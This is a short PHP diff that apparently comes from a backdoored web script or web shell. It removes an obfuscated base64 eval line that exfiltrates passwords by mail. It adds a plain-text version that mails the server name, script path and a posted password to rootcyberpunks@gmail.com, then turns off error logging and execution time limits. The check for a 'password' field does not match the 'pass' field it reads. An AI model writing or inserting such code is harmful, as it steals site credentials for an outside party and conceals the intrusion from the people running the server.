@@ -1,5 +1,7 @@
 <?php 
-eval(base64_decode("aWYoYXJyYXlfa2V5X2V4aXN0cygnbXlwYXNzJywkX1BPU1QpKXsgJHRtcCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9QT1NUWydwYXNzJ107IEBtYWlsKCdyb290Y3liZXJwdW5rc0BnbWFpbC5jb20nLCAnbWFpbCcsICR0bXApOyAKaWYgKGFycmF5X2tleV9leGlzdHMoJ215cGFzcycsICRfUE9TVCkpIHsKCQkkcGFzc3dvcmQgPSAkX1BPU1RbJ3Bhc3MnXTsKCQkkc2VydmVyX25hbWUgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKCQkkcGhwX3NlbGYgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTsKCQkkcmVwb3J0X2J1ZyA9ICJJUDogIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBDaXR5OiB7JGNpdHl9XG5Mb2dpbjogJHNlcnZlcl9uYW1lJHBocF9zZWxmXG5QYXNzOiAkcGFzc3dvcmRcbktlcm5lbDogJGtlcm5lbCI7CgkJQG1haWwoJ3Jvb3RjeWJlcnB1bmtzQGdtYWlsLmNvbScsICdIZWhlaGUnLCAkcmVwb3J0X2J1Zyk7"));
+if(array_key_exists('password',$_POST)){ $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; 
+@mail('rootcyberpunks@gmail.com', 'mail', $tmp); 
+                                    
 @ini_set('error_log',NULL); 
 @ini_set('log_errors',0); 
 @ini_set('max_execution_time',0); 
